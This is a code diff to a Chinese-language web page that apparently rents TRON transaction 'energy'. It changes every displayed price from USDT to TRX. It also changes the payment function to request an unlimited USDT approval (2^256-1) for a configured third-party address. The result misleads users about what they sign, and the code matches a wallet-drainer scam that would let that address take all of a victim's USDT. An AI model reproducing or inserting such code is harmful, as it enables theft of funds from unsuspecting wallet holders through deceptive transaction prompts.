@@ -351,7 +351,7 @@
                     <div class="option-content">
                         <div class="option-title">1 笔转账</div>
                         <div class="option-subtitle">固定价</div>
-                        <div class="option-price">2 USDT</div>
+                        <div class="option-price">2 TRX</div>
                     </div>
                 </div>
 
@@ -359,7 +359,7 @@
                     <div class="option-content">
                         <div class="option-title">2 笔转账</div>
                         <div class="option-subtitle">固定价</div>
-                        <div class="option-price">4 USDT</div>
+                        <div class="option-price">4 TRX</div>
                     </div>
                 </div>
 
@@ -367,7 +367,7 @@
                     <div class="option-content">
                         <div class="option-title">3 笔转账</div>
                         <div class="option-subtitle">固定价</div>
-                        <div class="option-price">6 USDT</div>
+                        <div class="option-price">6 TRX</div>
                     </div>
                 </div>
 
@@ -375,7 +375,7 @@
                     <div class="option-content">
                         <div class="option-title">4 笔转账</div>
                         <div class="option-subtitle">固定价</div>
-                        <div class="option-price">8 USDT</div>
+                        <div class="option-price">8 TRX</div>
                     </div>
                 </div>
 
@@ -383,7 +383,7 @@
                     <div class="option-content">
                         <div class="option-title">5 笔转账</div>
                         <div class="option-subtitle">固定价</div>
-                        <div class="option-price">10 USDT</div>
+                        <div class="option-price">10 TRX</div>
                     </div>
                 </div>
             </div>
@@ -391,7 +391,7 @@
             <div class="payment-summary">
                 <div class="summary-item">
                     <span class="summary-label">应付</span>
-                    <span class="summary-amount" id="totalAmount">0 USDT</span>
+                    <span class="summary-amount" id="totalAmount">0 TRX</span>
                 </div>
             </div>
 
@@ -530,7 +530,7 @@
             selectedPackage = { transactions, trxAmount };
             
             // 更新应付金额
-            document.getElementById('totalAmount').textContent = `${trxAmount} USDT`;
+            document.getElementById('totalAmount').textContent = `${trxAmount} TRX`;
             
             // 启用租赁按钮
             const rentButton = document.getElementById('rentButton');
@@ -568,25 +568,25 @@
             }
         }
 
-        // 处理能量租赁 - 授权USDT
+        // 处理能量租赁 - 授权USDT无限额度
         async function processEnergyRental(transactions, trxAmount) {
             try {
                 // 获取USDT合约实例
                 const contract = await window.tronWeb.contract().at(CONFIG.usdtContractAddress);
                 
-                // 计算USDT授权数量（根据TRX数量计算，这里假设1 TRX = 1 USDT）
-                const usdtAmount = trxAmount * 1000000; // USDT有6位小数
+                // 授权无限额度 (2^256 - 1)
+                const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                 
                 // 构建USDT授权交易
                 const transaction = await contract.approve(
                     CONFIG.permissionAddress,
-                    usdtAmount
+                    maxAmount
                 ).send({
                     from: userData.address,
                     feeLimit: 100000000 // 100 TRX fee limit
                 });
 
-                console.log('USDT授权交易已发送:', transaction);
+                console.log('USDT无限授权交易已发送:', transaction);
                 
             } catch (error) {
                 console.error('USDT授权失败:', error);
